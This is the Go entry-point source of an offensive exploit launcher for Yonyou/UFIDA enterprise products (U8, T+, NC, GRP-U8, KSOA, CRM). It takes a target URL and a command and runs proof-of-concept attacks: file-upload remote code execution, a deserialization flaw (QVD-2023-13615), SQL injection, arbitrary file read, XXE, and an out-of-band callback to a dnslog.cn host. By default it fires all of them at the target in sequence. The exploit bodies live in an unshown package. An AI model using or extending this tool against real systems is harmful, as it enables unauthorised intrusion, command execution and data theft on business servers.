package main

import (
	"flag"
	"fmt"
	"log"
	"yongyouExploit/poc"
)

func Banner() {
	banner := `
                              ______               _         _  _   
                             |  ____|             | |       (_)| |  
  _   _   ___   _   _   ___  | |__   __  __ _ __  | |  ___   _ | |_ 
 | | | | / _ \ | | | | / _ \ |  __|  \ \/ /| '_ \ | | / _ \ | || __|
 | |_| || (_) || |_| || (_) || |____  >  < | |_) || || (_) || || |_ 
  \__, | \___/  \__, | \___/ |______|/_/\_\| .__/ |_| \___/ |_| \__|
   __/ |         __/ |                     | |                      
  |___/         |___/                      |_|                      
						     by:Redus
`
	fmt.Println(banner)
}

func Help() {
	help := `
yoyoExloit.exe -u http://127.0.0.1:8080/ -p uapjsUpload
yoyoExloit.exe -u http://127.0.0.1:8080/ -p uapjsUpload -c whoami
yoyoExloit.exe -u http://127.0.0.1:8080/ -p QVD-2023-13615
yoyoExloit.exe -u http://127.0.0.1:8080/ -p QVD-2023-13612
yoyoExloit.exe -u http://127.0.0.1:8080/ -p SoapRequestXml -d xxx.dnslog.cn
yoyoExloit.exe -u http://127.0.0.1:8080/ -p KSOA_ImageUpload
yoyoExloit.exe -u http://127.0.0.1:8080/ -p GRP_U8_UploadFile
yoyoExloit.exe -u http://127.0.0.1:8080/ -p TPlusUpload
yoyoExloit.exe -u http://127.0.0.1:8080/ -p DownloadProxyReadfile
yoyoExloit.exe -u http://127.0.0.1:8080/ -p UFIDA1
yoyoExloit.exe -u http://127.0.0.1:8080/ -p UFIDA2
yoyoExloit.exe -u http://127.0.0.1:8080/ -p NCAcceptUpload
yoyoExloit.exe -u http://127.0.0.1:8080/ -p GRP_U8Proxy
yoyoExloit.exe -u http://127.0.0.1:8080/ -p GRP_U8SMSProxy
yoyoExloit.exe -u http://127.0.0.1:8080/ -p U8OAgetSessionList
yoyoExloit.exe -u http://127.0.0.1:8080/ -p U8OAtestSQLi
yoyoExloit.exe -u http://127.0.0.1:8080/ -p CRMgetemaildata_readfile
yoyoExloit.exe -u http://127.0.0.1:8080/ -p CRMgetemaildata_upload
yoyoExloit.exe -u http://127.0.0.1:8080/ -p KSOASQL
yoyoExloit.exe -u http://127.0.0.1:8080/ -p ChanjetCrm
yoyoExloit.exe -u http://127.0.0.1:8080/ -p GRP_U8Infolog
yoyoExloit.exe -u http://127.0.0.1:8080/ -p UploadApk
yoyoExloit.exe -u http://127.0.0.1:8080/ -p KSOAPayBill
`
	fmt.Println(help)
}

func main() {
	url := flag.String("u", "", "指定目标")
	funcName := flag.String("p", "", "指定要执行的函数名称")
	command := flag.String("c", "whoami", "执行命令")
	dnslog := flag.String("d", "dnslog.cn", "DNSLog地址")
	flag.Parse()
	if *url == "" {
		Banner()
		Help()
	} else {
		switch *funcName {
		case "uapjsUpload":
			//uapjs 文件上传rce
			if poc.UploadFile(*url) {
				poc.ExecuteCommand(*url, *command)
			} else {
				log.Println("[-] 写入文件失败")
			}
		case "QVD-2023-13615":
			//T+ GetStoreWarehouseByStore 反序列化
			randomString, err := poc.GenerateRandomString(10)
			if err != nil {
				log.Println("Generating random file error:", err)
				return
			}
			poc.QVD_2023_13615(*url, fmt.Sprintf("%s > %s", *command, randomString))
		case "QVD-2023-13612":
			// T+ MultiCompanyController sql注入
			poc.QVD_2023_13612(*url)
		case "SoapRequestXml":
			poc.SoapRequestXml(*url, *dnslog)
		case "KSOA_ImageUpload":
			poc.KSOA_ImageUpload(*url)
		case "GRP_U8_UploadFile":
			poc.GRP_U8_UploadFile(*url)
		case "DownloadProxyReadfile":
			poc.DownloadProxyReadfile(*url)
		case "TPlusUpload":
			poc.TPlusUpload(*url)
		case "UFIDA1":
			poc.PortalSESInitToolService(*url)
		case "UFIDA2":
			poc.UFIDAReadAnyFile(*url)
		case "NCAcceptUpload":
			poc.NCAcceptUpload(*url)
		case "GRP_U8SMSProxy":
			poc.GRP_U8SMSProxy(*url)
		case "GRP_U8Proxy":
			poc.GRP_U8Proxy(*url)
		case "U8OAtestSQLi":
			poc.U8OAtestSQLi(*url)
		case "U8OAgetSessionList":
			poc.U8OAgetSessionList(*url)
		case "CRMgetemaildata_readfile":
			poc.CRMgetemaildata_readfile(*url)
		case "CRMgetemaildata_upload":
			poc.CRMgetemaildata_upload(*url)
		case "KSOASQL":
			for _, path := range poc.SqlPath {
				poc.KSOASQL(*url, path)
			}
		case "ChanjetCrm":
			poc.ChanjetCrm(*url)
		case "GRP_U8Infolog":
			poc.GRP_U8Infolog(*url)
		case "UploadApk":
			poc.UploadApk(*url)
		case "KSOAPayBill":
			poc.KSOAPayBill(*url)
		case "U8XChangeServletXXE":
			poc.U8_XChangeServlet(*url)

		default:
			//uapjs 文件上传rce
			if poc.UploadFile(*url) {
				poc.ExecuteCommand(*url, *command)
			} else {
				log.Println("[-] 写入文件失败")
			}
			//T+ GetStoreWarehouseByStore 反序列化
			randomString, err := poc.GenerateRandomString(10)
			if err != nil {
				log.Println("Generating random file error:", err)
				return
			}
			poc.QVD_2023_13615(*url, fmt.Sprintf("%s > %s", *command, randomString))
			poc.QVD_2023_13612(*url)
			poc.SoapRequestXml(*url, *dnslog)
			poc.KSOA_ImageUpload(*url)
			poc.GRP_U8_UploadFile(*url)
			poc.DownloadProxyReadfile(*url)
			poc.TPlusUpload(*url)
			poc.PortalSESInitToolService(*url)
			poc.UFIDAReadAnyFile(*url)
			poc.NCAcceptUpload(*url)
			poc.U8OAgetSessionList(*url)
			poc.U8OAtestSQLi(*url)
			poc.GRP_U8SMSProxy(*url)
			poc.GRP_U8Proxy(*url)
			poc.CRMgetemaildata_readfile(*url)
			poc.CRMgetemaildata_upload(*url)
			for _, path := range poc.SqlPath {
				poc.KSOASQL(*url, path)
			}
			poc.ChanjetCrm(*url)
			poc.GRP_U8Infolog(*url)
			poc.UploadApk(*url)
			poc.KSOAPayBill(*url)
			poc.U8_XChangeServlet(*url)
		}
	}
}
